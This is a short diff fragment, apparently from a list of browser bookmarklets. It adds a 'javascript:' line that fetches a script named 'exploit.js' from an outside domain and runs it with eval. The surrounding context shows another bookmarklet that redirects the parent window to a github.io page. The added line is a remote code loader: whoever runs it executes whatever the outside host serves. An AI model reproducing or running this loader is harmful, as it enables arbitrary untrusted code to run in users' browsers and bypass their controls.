@@ -24,7 +24,7 @@ javacript: <script>window.parent.location.href = "https://blobby-boi.github.io/B
 
 
 
-
+javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 
 
 
